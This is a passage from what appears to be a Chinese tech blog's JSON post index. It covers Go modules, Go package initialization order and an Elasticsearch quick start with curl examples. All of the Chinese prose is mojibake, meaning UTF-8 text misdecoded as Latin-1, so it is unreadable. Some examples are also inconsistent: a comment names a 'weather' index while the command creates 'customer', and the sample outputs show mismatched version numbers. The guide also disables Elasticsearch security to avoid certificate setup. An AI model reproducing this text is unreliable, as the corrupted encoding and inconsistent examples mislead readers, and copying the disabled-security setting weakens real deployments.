moduleé¦–å…ˆæ¥åˆ›å»ºä¸€ä¸ª hellomodule.go çš„æºæ–‡ä»¶ã€‚ 1234567891011121314151617181920// hellomodule.gopackage mainimport ( \"github.com/valyala/fasthttp\" \"go.uber.org/zap\")var logger *zap.Loggerfunc init() &#123; logger, _ = zap.NewProduction()&#125;func fastHTTPHandler(ctx *fasthttp.RequestCtx) &#123; logger.Info(\"hello, go module\", zap.ByteString(\"uri\", ctx.RequestURI()))&#125;func main() &#123; fasthttp.ListenAndServe(\":8081\", fastHTTPHandler)&#125; å…ˆä¸ç”¨åœ¨æ„æ¯è¡Œä»£ç çš„æ„æ€ï¼Œåªéœ€è¦çŸ¥é“åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé€šè¿‡ import å¼•å…¥äº†ä¸¤ä¸ªç¬¬ä¸‰æ–¹ä¾èµ–åº“ã€‚ æ¥ä¸‹æ¥ï¼Œé€šè¿‡ä¸‹é¢å‘½ä»¤ä¸º â€œhellomoduleâ€ è¿™ä¸ªç¤ºä¾‹ç¨‹åºæ·»åŠ  go.mod æ–‡ä»¶ï¼š 1234$ go mod init hellomodulego: creating new go.mod: module hellomodulego: to add module requirements and sums: go mod tidy go mod init å‘½ä»¤çš„æ‰§è¡Œç»“æœæ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ª go.mod æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼š 12345$ cat go.modmodule hellomodulego 1.18 å…¶å®ï¼Œä¸€ä¸ª module å°±æ˜¯ä¸€ä¸ªåŒ…çš„é›†åˆï¼Œè¿™äº›åŒ…å’Œ module ä¸€èµ·æ‰“ç‰ˆæœ¬ã€å‘å¸ƒå’Œåˆ†å‘ã€‚go.mod æ‰€åœ¨çš„ç›®å½•è¢«æˆ‘ä»¬ç§°ä¸ºå®ƒå£°æ˜çš„ module çš„æ ¹ç›®å½•ã€‚ æœ‰äº† go.mod ä¹‹åï¼Œè¿˜ä¸èƒ½ç«‹é©¬æ„å»º â€œhellomoduleâ€ ï¼Œå› ä¸ºéœ€è¦æ·»åŠ æºç ä¾èµ–ï¼Œä¹Ÿå°±æ˜¯ä»£ç ä¸­ç”¨åˆ°çš„ fasthttp å’Œ zap è¿™ä¸¤ä¸ªç¬¬ä¸‰æ–¹åŒ…ã€‚ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è‡ªåŠ¨æ·»åŠ ï¼š 1$ go mod tidy å†æ¬¡æŸ¥çœ‹ go.mod æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°å¤šäº†å¾ˆå¤šå†…å®¹ï¼š 123456789101112131415161718$ cat go.modmodule hellomodulego 1.18require ( github.com/valyala/fasthttp v1.41.0 go.uber.org/zap v1.23.0)require ( github.com/andybalholm/brotli v1.0.4 // indirect github.com/klauspost/compress v1.15.9 // indirect github.com/valyala/bytebufferpool v1.0.0 // indirect go.uber.org/atomic v1.7.0 // indirect go.uber.org/multierr v1.6.0 // indirect) è¿˜ä¼šå‘ç°æœ¬åœ°å¤šäº†ä¸€ä¸ª go.sum çš„æ–‡ä»¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯è®°å½•é¡¹ç›®çš„ç›´æ¥ä¾èµ–å’Œé—´æ¥ä¾èµ–åŒ…çš„ç›¸å…³ç‰ˆæœ¬çš„ hash å€¼ï¼Œç”¨æ¥æ ¡éªŒæœ¬åœ°åŒ…çš„çœŸå®æ€§ã€‚åœ¨æ„å»ºçš„æ—¶å€™ï¼Œå¦‚æœæœ¬åœ°ä¾èµ–åŒ…çš„ hash å€¼ä¸ go.sum æ–‡ä»¶ä¸­è®°å½•çš„ä¸ä¸€è‡´ï¼Œå°±ä¼šè¢«æ‹’ç»æ„å»ºã€‚ ç°åœ¨å°±å¯ä»¥è¿›è¡Œç¼–è¯‘äº†ï¼š 12345$ go build hellomodule.go$ lsgo.mod go.sum hellomodule* hellomodule.go$ ./hellomodule å¯åŠ¨æœåŠ¡ï¼Œç„¶åè®¿é—® localhost:8081ï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶å°è¾“å‡ºä»¥ä¸‹å†…å®¹ï¼Œå³è¡¨ç¤ºæœåŠ¡æ­£å¸¸ 1&#123;\"level\":\"info\",\"ts\":1667202109.444561,\"caller\":\"hellomodule/hellomodule.go:14\",\"msg\":\"hello, go module\",\"uri\":\"/\"&#125; æ€»ç»“ Go æºç éœ€è¦å…ˆç¼–è¯‘ï¼Œå†åˆ†å‘å’Œè¿è¡Œ å¦‚æœæ˜¯å• Go æºæ–‡ä»¶çš„æƒ…å†µï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ go build å‘½ä»¤ + Go æºæ–‡ä»¶åçš„æ–¹å¼ç¼–è¯‘ å¯¹äºå¤æ‚çš„ Go é¡¹ç›®ï¼Œéœ€è¦åœ¨ Go Module çš„å¸®åŠ©ä¸‹å®Œæˆé¡¹ç›®çš„æ„å»º Go Module å·²ç»æ˜¯ go å®˜æ–¹æ ‡å‡†åŒ…ä¾èµ–ç®¡ç†å’Œæ„å»ºæ¨¡å¼äº†ï¼Œgopath æ¨¡å¼äº†è§£å³å¯ go mod init å‘½ä»¤ä¸ºé¡¹ç›®åˆ›å»ºä¸€ä¸ª Go Module go mod tidy å‘½ä»¤è‡ªåŠ¨æ·»åŠ ç¬¬ä¸‰æ–¹ä¾èµ– å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å…¥å£å‡½æ•°ä¸åˆå§‹åŒ–æ¬¡åº","slug":"go-language-study-notes-entry-function-and-initialization-order","date":"2022-10-23T14:30:54.000Z","updated":"2023-02-18T03:28:33.587Z","comments":true,"path":"go-language-study-notes-entry-function-and-initialization-order/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-entry-function-and-initialization-order/","excerpt":"Go ç¨‹åºç”±ä¸€ç³»åˆ— Go åŒ…ç»„æˆï¼Œä»£ç çš„æ‰§è¡Œæ˜¯åœ¨å„ä¸ªåŒ…ä¹‹é—´æ¥å›è·³è½¬ã€‚å’Œå…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒGo ä¹Ÿæ‹¥æœ‰è‡ªå·±çš„ç”¨æˆ·å±‚å…¥å£â€”â€”main å‡½æ•°ï¼Œé€šè¿‡ main å…¥å£å‡½æ•°ï¼Œé€æ­¥äº†è§£ Go ç¨‹åºçš„æ‰§è¡Œæ¬¡åºã€‚","text":"Go ç¨‹åºç”±ä¸€ç³»åˆ— Go åŒ…ç»„æˆï¼Œä»£ç çš„æ‰§è¡Œæ˜¯åœ¨å„ä¸ªåŒ…ä¹‹é—´æ¥å›è·³è½¬ã€‚å’Œå…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒGo ä¹Ÿæ‹¥æœ‰è‡ªå·±çš„ç”¨æˆ·å±‚å…¥å£â€”â€”main å‡½æ•°ï¼Œé€šè¿‡ main å…¥å£å‡½æ•°ï¼Œé€æ­¥äº†è§£ Go ç¨‹åºçš„æ‰§è¡Œæ¬¡åºã€‚ main å‡½æ•°Go è¯­è¨€ä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å‡½æ•°ï¼šmain åŒ…ä¸­çš„ main å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ main.mainï¼Œå®ƒæ˜¯æ‰€æœ‰ Go å¯æ‰§è¡Œç¨‹åºçš„ç”¨æˆ·å±‚æ‰§è¡Œé€»è¾‘çš„å…¥å£å‡½æ•°ã€‚ Go ç¨‹åºåœ¨ç”¨æˆ·å±‚é¢çš„æ‰§è¡Œé€»è¾‘ï¼Œä¼šåœ¨è¿™ä¸ªå‡½æ•°å†…æŒ‰ç…§å®ƒçš„è°ƒç”¨é¡ºåºå±•å¼€ã€‚ main å‡½æ•°çš„å‡½æ•°åŸå‹æ˜¯è¿™æ ·çš„ï¼š 123456package mainfunc main() &#123; // ç”¨æˆ·å±‚æ‰§è¡Œé€»è¾‘ // ... ...&#125; main å‡½æ•°çš„å‡½æ•°åŸå‹éå¸¸ç®€å•ï¼Œæ²¡æœ‰å‚æ•°ä¹Ÿæ²¡æœ‰è¿”å›å€¼ã€‚ è€Œä¸”ï¼ŒGo è¯­è¨€è¦æ±‚ï¼šå¯æ‰§è¡Œç¨‹åºçš„ main åŒ…å¿…é¡»å®šä¹‰ main å‡½æ•°ï¼Œå¦åˆ™ Go ç¼–è¯‘å™¨ä¼šæŠ¥é”™â€”â€”â€œruntime.main_mainÂ·f: function main is undeclared in the main packageâ€ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯åªæœ‰ main åŒ…ä¸­æ‰å…è®¸æœ‰ main å‡½æ•°ï¼Œå…¶ä»–åŒ…ä¸­ä¹Ÿæ˜¯å¯ä»¥æ‹¥æœ‰åä¸º main çš„å‡½æ•°æˆ–è€…æ–¹æ³•ï¼Œåªæ˜¯å› ä¸ºå…¶å¯è§æ€§è§„åˆ™ï¼Œé main åŒ…ä¸­è‡ªå®šä¹‰çš„ main å‡½æ•°ä»…é™äºåŒ…å†…ä½¿ç”¨ã€‚ 123456789101112package pkg1 import \"fmt\"func Main() &#123; main()&#125;// è¿™é‡Œ main å‡½æ•°å°±ä¸»è¦æ˜¯ç”¨æ¥åœ¨åŒ… pkg1 å†…éƒ¨ä½¿ç”¨çš„ï¼Œå®ƒæ˜¯æ²¡æ³•åœ¨åŒ…å¤–ä½¿ç”¨çš„func main() &#123; fmt.Println(\"main func for pkg1\")&#125; init å‡½æ•°ä¸è¿‡å¯¹äº main åŒ…çš„ main å‡½æ•°æ¥è¯´ï¼Œè¿˜æœ‰ä¸€ç‚¹éœ€è¦æ˜ç¡®ï¼Œå°±æ˜¯å®ƒè™½ç„¶æ˜¯ç”¨æˆ·å±‚é€»è¾‘çš„å…¥å£å‡½æ•°ï¼Œä½†å®ƒå´ä¸ä¸€å®šæ˜¯ç”¨æˆ·å±‚ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œçš„å‡½æ•°ã€‚ è¿™æ˜¯å› ä¸ºGo è¯­è¨€è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šå‡½æ•°çš„å­˜åœ¨â€”â€”init å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯å¯¹åŒ…è¿›è¡Œåˆå§‹åŒ–ã€‚ å’Œ main.main å‡½æ•°ä¸€æ ·ï¼Œinit å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªæ— å‚æ•°æ— è¿”å›å€¼çš„å‡½æ•°ï¼š 123456package mainfunc init() &#123; // åŒ…åˆå§‹åŒ–é€»è¾‘ // ... ...&#125; å¦‚æœ main åŒ…ä¾èµ–çš„åŒ…ä¸­å®šä¹‰äº† init å‡½æ•°ï¼Œæˆ–è€…æ˜¯ main åŒ…è‡ªèº«å®šä¹‰äº† init å‡½æ•°ï¼Œé‚£ä¹ˆ Go ç¨‹åºåœ¨è¿™ä¸ªåŒ…åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒçš„ init å‡½æ•°ï¼Œå› æ­¤è¿™äº› init å‡½æ•°çš„æ‰§è¡Œå°±éƒ½ä¼šå‘ç”Ÿåœ¨ main å‡½æ•°ä¹‹å‰ã€‚ æ³¨æ„ï¼šinit å‡½æ•°ä¸ç”¨æ˜¾å¼è°ƒç”¨ï¼Œå¦åˆ™ä¼šç¼–è¯‘é”™è¯¯â€”â€”â€œundefined: initâ€ã€‚ Go åŒ…çš„åˆå§‹åŒ–æ¬¡åºä»ç¨‹åºé€»è¾‘ç»“æ„è§’åº¦æ¥çœ‹ï¼ŒGo åŒ…æ˜¯ç¨‹åºé€»è¾‘å°è£…çš„åŸºæœ¬å•ä½ï¼Œæ¯ä¸ªåŒ…å¯ä»¥ç†è§£æˆæ˜¯ä¸€ä¸ªâ€œè‡ªæ²»â€çš„ã€å°è£…è‰¯å¥½çš„ã€å¯¹å¤–éƒ¨æš´éœ²æœ‰é™æ¥å£çš„åŸºæœ¬å•å…ƒã€‚ ä¸€ä¸ª Go ç¨‹åºå°±æ˜¯ç”±ä¸€ç»„åŒ…ç»„æˆçš„ï¼Œç¨‹åºçš„åˆå§‹åŒ–å°±æ˜¯è¿™äº›åŒ…çš„åˆå§‹åŒ–ã€‚æ¯ä¸ªåŒ…æ‹¥æœ‰è‡ªå·±çš„ä¾èµ–åŒ…ã€å˜é‡ã€å¸¸é‡ã€init å‡½æ•°ã€ï¼ˆmain å‡½æ•°ï¼‰ç­‰ã€‚ å¯ä»¥å€ŸåŠ©ä¸‹é¢è¿™å¼ å›¾æ¥åŠ æ·±å¯¹åˆå§‹åŒ–æ¬¡åºçš„ç†è§£ã€‚ é¦–å…ˆï¼Œmain åŒ…ä¾èµ– pkg1ã€pkg4 è¿™ä¸¤ä¸ªåŒ…ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥ï¼ŒGo ä¼šæ ¹æ®åŒ…çš„å¯¼å…¥é¡ºåºï¼Œä¾æ¬¡å»åˆå§‹åŒ– main åŒ…ä¸‹é¢çš„ä¾èµ–åŒ…ã€‚ ç¬¬äºŒæ­¥ï¼ŒGo åœ¨è¿›è¡ŒåŒ…åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œä¼šé‡‡ç”¨æ·±åº¦ä¼˜å…ˆçš„åŸåˆ™ï¼Œé€’å½’åˆå§‹åŒ–å„ä¸ªåŒ…çš„ä¾èµ–åŒ…ã€‚å¯¹åº”åˆ°ä¸Šå›¾ï¼Œä¹Ÿå°±æ˜¯ pkg1 ä¾èµ– pkg2ï¼Œpkg2 ä¾èµ– pkg3ï¼Œpkg3 æ²¡æœ‰ä¾èµ–åŒ…ï¼Œäºæ˜¯ Go åœ¨ pkg3 åŒ…ä¸­æŒ‰ç…§å¸¸é‡ -&gt; å˜é‡ -&gt; init å‡½æ•°çš„é¡ºåºå…ˆå¯¹ pkg3 åŒ…è¿›è¡Œåˆå§‹åŒ–ï¼ˆè¿™ä¸ªå°±æ˜¯æ·±åº¦ä¼˜å…ˆåŸåˆ™ï¼Œä»å†…å¾€å¤–ä¾æ¬¡åˆå§‹åŒ–ï¼‰ã€‚ ç´§æ¥ç€ï¼Œåœ¨ pkg3 åŒ…åˆå§‹åŒ–å®Œæ¯•åï¼ŒGo ä¼šå›åˆ° pkg2 åŒ…å¹¶å¯¹ pkg2 åŒ…è¿›è¡Œåˆå§‹åŒ–ï¼Œæ¥ä¸‹æ¥å†å›åˆ° pkg1 åŒ…å¹¶å¯¹ pkg1 åŒ…è¿›è¡Œåˆå§‹åŒ–ã€‚åœ¨è°ƒç”¨å®Œ pkg1 åŒ…çš„ init å‡½æ•°åï¼ŒGo å°±å®Œæˆäº† main åŒ…çš„ç¬¬ä¸€ä¸ªä¾èµ–åŒ… pkg1 çš„åˆå§‹åŒ–ã€‚ æ¥ä¸‹æ¥ï¼ŒGo ä¼šåˆå§‹åŒ– main åŒ…çš„ç¬¬äºŒä¸ªä¾èµ–åŒ… pkg4ï¼Œpkg4 åŒ…çš„åˆå§‹åŒ–è¿‡ç¨‹ä¸ pkg1 åŒ…ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å…ˆåˆå§‹åŒ–å®ƒçš„ä¾èµ–åŒ… pkg5ï¼Œç„¶åå†åˆå§‹åŒ–è‡ªèº«ã€‚ ç„¶åï¼Œå½“ Go åˆå§‹åŒ–å®Œ pkg4 åŒ…åä¹Ÿå°±å®Œæˆäº†å¯¹ main åŒ…æ‰€æœ‰ä¾èµ–åŒ…çš„åˆå§‹åŒ–ï¼Œæ¥ä¸‹æ¥åˆå§‹åŒ– main åŒ…è‡ªèº«ã€‚ æœ€åï¼Œåœ¨ main åŒ…ä¸­ï¼ŒGo åŒæ ·ä¼šæŒ‰ç…§å¸¸é‡ -&gt; å˜é‡ -&gt; init å‡½æ•°çš„é¡ºåºè¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰§è¡Œå®Œè¿™äº›åˆå§‹åŒ–å·¥ä½œåæ‰æ­£å¼è¿›å…¥ç¨‹åºçš„å…¥å£å‡½æ•° main å‡½æ•°ã€‚ å¯¹äº†ï¼Œè¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœä¸€ä¸ªåŒ…åŒæ—¶è¢«å¤šä¸ªåŒ…ä¾èµ–ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ…ä»…ä¼šåˆå§‹åŒ–ä¸€æ¬¡ã€‚ æ€»ç»“å…³äº Go åŒ…çš„åˆå§‹åŒ–è®°ä½ä»¥ä¸‹ä¸‰ç‚¹å°±è¡Œï¼š ä¾èµ–åŒ…æŒ‰æ·±åº¦ä¼˜å…ˆçš„æ¬¡åºè¿›è¡Œåˆå§‹åŒ– æ¯ä¸ªåŒ…å†…æŒ‰ä»¥å¸¸é‡ -&gt; å˜é‡ -&gt; init å‡½æ•°çš„é¡ºåºè¿›è¡Œåˆå§‹åŒ– åŒ…å†…çš„å¤šä¸ª init å‡½æ•°æŒ‰å‡ºç°æ¬¡åºè¿›è¡Œè‡ªåŠ¨è°ƒç”¨ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"ElasticSearch å¿«é€Ÿä¸Šæ‰‹","slug":"elasticsearch-quick-start","date":"2022-10-22T09:58:44.000Z","updated":"2023-02-18T03:28:33.579Z","comments":true,"path":"elasticsearch-quick-start/","link":"","permalink":"https://www.0x2beace.com/elasticsearch-quick-start/","excerpt":"Elasticsearch æ˜¯ç›®å‰å…¨æ–‡æœç´¢å¼•æ“çš„é¦–é€‰ï¼Œå®ƒå¯ä»¥å¿«é€Ÿåœ°å‚¨å­˜ã€æœç´¢å’Œåˆ†ææµ·é‡æ•°æ®ï¼Œä¸‹é¢ç®€ç§° ESã€‚","text":"Elasticsearch æ˜¯ç›®å‰å…¨æ–‡æœç´¢å¼•æ“çš„é¦–é€‰ï¼Œå®ƒå¯ä»¥å¿«é€Ÿåœ°å‚¨å­˜ã€æœç´¢å’Œåˆ†ææµ·é‡æ•°æ®ï¼Œä¸‹é¢ç®€ç§° ESã€‚ ES åº•å±‚æ˜¯å¼€æºåº“ Luceneã€‚ä½†æ˜¯æ²¡æ³•ç›´æ¥ç”¨ Luceneï¼Œå¿…é¡»è‡ªå·±å†™ä»£ç å»è°ƒç”¨å®ƒçš„æ¥å£ã€‚ES æ˜¯ Lucene çš„å°è£…ï¼Œæä¾›äº† REST API çš„æ“ä½œæ¥å£ï¼Œå¼€ç®±å³ç”¨ã€‚ å®‰è£…ES éœ€è¦ Java 8 ç¯å¢ƒã€‚å¦‚æœä½ çš„æœºå™¨è¿˜æ²¡å®‰è£… Javaï¼Œå¯ä»¥è¿›è¡Œä¸‹è½½å®‰è£…ã€‚ ES çš„å®‰è£…æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„å‹ç¼©åŒ…è§£å‹å³å¯ï¼š 123curl -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.3-darwin-x86_64.tar.gzcurl https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.3-darwin-x86_64.tar.gz.sha512 | shasum -a 512 -c - tar -xzf elasticsearch-8.4.3-darwin-x86_64.tar.gz è¿™é‡Œä¸‹è½½å®‰è£…çš„æ˜¯æœ€æ–°ç‰ˆæœ¬ 8.4.3ã€‚ é¦–æ¬¡è§£å‹å®Œå¹¶ä¸èƒ½ç›´æ¥è¿è¡Œï¼Œéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€äº›é…ç½®ï¼ˆå¦‚æœä½ çš„æœºå™¨æœ‰é…ç½®è¯ä¹¦åˆ™å¯ä»¥å¿½ç•¥ï¼Œè¿™æ˜¯å› ä¸º ES é»˜è®¤å¼€å¯äº† ssl è®¤è¯ï¼‰ï¼š 12&#x2F;&#x2F; vim elasticsearch.ymlxpack.security.enabled: false è¿›å…¥è§£å‹åçš„ç›®å½•ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå¯åŠ¨ ESï¼š 1bin/elasticsearch å¦‚æœè¿™æ—¶æŠ¥é”™ â€œmax virtual memory areas vm.maxmapcount [65530] is too lowâ€ï¼Œè¦è¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ 1sudo sysctl -w vm.max_map_count=262144 å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼ŒES å°±ä¼šåœ¨é»˜è®¤çš„ 9200 ç«¯å£è¿è¡Œï¼Œè®¿é—®localhost:9200ä¼šè¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼š 1234567891011121314151617&#123; \"name\" : \"192.168.123.11\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"GUgWHb9ERuOo230FP2os4g\", \"version\" : &#123; \"number\" : \"8.4.3\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"42f05b9372a9a4a470db3b52817899b99a76ee73\", \"build_date\" : \"2022-10-04T07:17:24.662462378Z\", \"build_snapshot\" : false, \"lucene_version\" : \"9.3.0\", \"minimum_wire_compatibility_version\" : \"7.17.0\", \"minimum_index_compatibility_version\" : \"7.0.0\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; head æ’ä»¶å®‰è£…elasticsearch-head æ˜¯ä¸€ä¸ªES é›†ç¾¤çš„ Web å‰ç«¯æ§åˆ¶å°ï¼Œå¯ä»¥å¯è§†åŒ–ç®¡ç† ESã€‚ å®‰è£…ä¹Ÿæ˜¯éå¸¸ç®€å•ï¼Œç›´æ¥ä¸‹è½½è§£å‹è¿è¡Œå³å¯ï¼š 1234git clone git:&#x2F;&#x2F;github.com&#x2F;mobz&#x2F;elasticsearch-head.gitcd elasticsearch-headnpm installnpm run start elasticsearch-head é»˜è®¤ç›‘å¬ 9100 ç«¯å£ï¼Œæ­£å¸¸è®¿é—® localhost:9100 ä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼š æ³¨æ„çœ‹ï¼Œæˆ‘è¿™é‡Œçš„é›†ç¾¤å¥åº·å€¼æ˜¯ redï¼Œç´¢å¼•çš„æ—è¾¹å‡ºç°äº†ä¸€ä¸ª unassignedï¼Œå‡ºç° unassigned çš„åŸå› é€šå¸¸æœ‰ï¼š ç£ç›˜ç©ºé—´ä¸è¶³ï¼ˆæ§åˆ¶ç£ç›˜ä½¿ç”¨çš„é«˜æ°´ä½ã€‚é»˜è®¤ä¸º90%ï¼‰ nodes æ•°å°äºåˆ†ç‰‡å‰¯æœ¬æ•° èŠ‚ç‚¹å¤±è” å¥åº·å€¼æœ‰ä¸‰ä¸ªå€¼ï¼š green yellow red å¦‚æœå¤„äº redï¼Œå¾ˆå¤šæ“ä½œæ˜¯åšä¸äº†çš„ï¼Œæˆ‘è¿™é‡Œæ˜¯å› ä¸ºç£ç›˜ç©ºé—´ä¸è¶³è€Œå¯¼è‡´çš„ï¼Œé‡Šæ”¾æ‰ç£ç›˜ç©ºé—´ä¹‹åä¾¿æ¢å¤ green äº†ï¼š åŸºæœ¬æ¦‚å¿µNode ä¸ ClusterES æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®åº“ï¼Œå…è®¸å¤šå°æœåŠ¡å™¨ååŒå·¥ä½œï¼Œæ¯å°æœåŠ¡å™¨ä¹Ÿå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªå®ä¾‹ã€‚ å•ä¸ª ES å®ä¾‹ç§°ä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼ˆnodeï¼‰ã€‚ä¸€ç»„èŠ‚ç‚¹æ„æˆä¸€ä¸ªé›†ç¾¤ï¼ˆclusterï¼‰ã€‚ IndexIndex æ˜¯ ES çš„æ ¸å¿ƒæ¦‚å¿µï¼ŒES ä¼šç´¢å¼•æ‰€æœ‰å­—æ®µï¼Œç»è¿‡å¤„ç†åå†™å…¥ä¸€ä¸ªåå‘ç´¢å¼•ï¼ˆInverted Indexï¼‰ã€‚æŸ¥æ‰¾æ•°æ®çš„æ—¶å€™ï¼Œç›´æ¥æŸ¥æ‰¾è¯¥ç´¢å¼•ã€‚ ES æ•°æ®ç®¡ç†çš„é¡¶å±‚å•ä½å°±å«åš Indexï¼ˆç´¢å¼•ï¼‰ã€‚å®ƒæ˜¯å•ä¸ªæ•°æ®åº“çš„åŒä¹‰è¯ã€‚æ¯ä¸ª Index ï¼ˆå³æ•°æ®åº“ï¼‰çš„åå­—å¿…é¡»æ˜¯å°å†™ã€‚ DocumentIndex é‡Œé¢å•æ¡çš„è®°å½•ç§°ä¸º Documentï¼ˆæ–‡æ¡£ï¼‰ã€‚è®¸å¤šæ¡ Document æ„æˆäº†ä¸€ä¸ª Indexã€‚ Document ä½¿ç”¨ JSON æ ¼å¼è¡¨ç¤ºï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š 1234&#123; \"name\": \"æå››\", \"gender\": \"ç”·\"&#125; Typeæ•°æ®æ“ä½œåˆ›å»ºç´¢å¼•åˆ›å»º Indexï¼Œå¯ä»¥ç›´æ¥å‘ ES æœåŠ¡å™¨å‘å‡º PUT è¯·æ±‚ã€‚ 12# åˆ›å»ºä¸€ä¸ª weather çš„ Indexcurl -X PUT 'localhost:9200/customer' åˆ é™¤ç´¢å¼•é€šè¿‡ DELETE è¯·æ±‚åˆ é™¤ Index 1curl -X DELETE 'localhost:9200/weather' æ–°å¢è®°å½•12345curl -X PUT \"localhost:9200/customer/_doc/1?pretty\" -H 'Content-Type: application/json' -d'&#123; \"name\": \"æå››\", \"gender\": \"ç”·\"&#125;' pretty å‚æ•°çš„ä½œç”¨æ˜¯ä»¥æ˜“è¯»çš„æ ¼å¼è¿”å›ã€‚ æ³¨æ„ï¼Œè¿™é‡Œè¯·æ±‚åœ°å€æ˜¯customer/_doc/1ï¼Œæœ€åçš„1æ˜¯è¯¥æ¡è®°å½•çš„ Idã€‚å®ƒä¸ä¸€å®šæ˜¯æ•°å­—ï¼Œä»»æ„å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚abcï¼‰éƒ½å¯ä»¥ã€‚ æ–°å¢è®°å½•çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥ä¸æŒ‡å®š Idï¼Œè¿™æ—¶è¦æ”¹æˆ POST è¯·æ±‚ã€‚ 12345678910111213141516171819curl -X POST \"localhost:9200/customer/_doc?pretty\" -H 'Content-Type: application/json' -d'&#123; \"name\": \"å¼ ä¸‰\", \"gender\": \"ç”·\"&#125;'&#123; \"_index\" : \"customer\", \"_id\" : \"-c3r_oMBDokqbW4aIGss\", \"_version\" : 1, \"result\" : \"created\", \"_shards\" : &#123; \"total\" : 2, \"successful\" : 1, \"failed\" : 0 &#125;, \"_seq_no\" : 3, \"_primary_term\" : 1&#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨è¯¥è¯·æ±‚æ–¹å¼æ—¶ï¼Œå¦‚æœå¯¹åº”çš„ç´¢å¼•ä¸å­˜åœ¨ï¼ˆä¾‹å­ä¸­æ˜¯customerï¼‰ï¼ŒES åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºè¯¥ç´¢å¼•ã€‚ æŸ¥çœ‹è®°å½•é€šè¿‡ elasticsearch-head æŸ¥çœ‹æ•°æ®ï¼š é€šè¿‡ç»ˆç«¯æŒ‡å®š Document ID æŸ¥çœ‹å¯¹åº”çš„è®°å½•ï¼š 12345678910111213curl -X GET \"localhost:9200/customer/_doc/1?pretty\"&#123; \"_index\" : \"customer\", \"_id\" : \"1\", \"_version\" : 3, \"_seq_no\" : 2, \"_primary_term\" : 1, \"found\" : true, \"_source\" : &#123; \"name\" : \"æå››\", \"gender\" : \"ç”·\" &#125;&#125; è¿”å›çš„æ•°æ®ä¸­ï¼Œfoundå­—æ®µè¡¨ç¤ºæŸ¥è¯¢æˆåŠŸï¼Œ_source å­—æ®µè¿”å›åŸå§‹è®°å½•ã€‚å¦‚æœ Id ä¸æ­£ç¡®ï¼Œå°±æŸ¥ä¸åˆ°æ•°æ®ï¼Œfoundå­—æ®µå°±æ˜¯falseã€‚ æ›´æ–°è®°å½•123456789101112131415161718curl -X PUT \"localhost:9200/customer/_doc/1?pretty\" -H 'Content-Type: application/json' -d'&#123; \"name\": \"ç‹äº”\", \"gender\": \"ç”·\"&#125;'&#123; \"_index\" : \"customer\", \"_id\" : \"1\", \"_version\" : 2, \"result\" : \"updated\", \"_shards\" : &#123; \"total\" : 2, \"successful\" : 1, \"failed\" : 0 &#125;, \"_seq_no\" : 4, \"_primary_term\" : 1&#125; ä¸Šé¢ä»£ç ä¸­ï¼Œå°†åŸå§‹æ•°æ®ä»â€æå››â€æ”¹æˆâ€œç‹äº”â€ã€‚ è¿”å›ç»“æœé‡Œé¢ï¼Œæœ‰å‡ ä¸ªå­—æ®µå‘ç”Ÿäº†å˜åŒ–ã€‚ 123&quot;_version&quot; : 2,&quot;result&quot; : &quot;updated&quot;,&quot;created&quot; : false 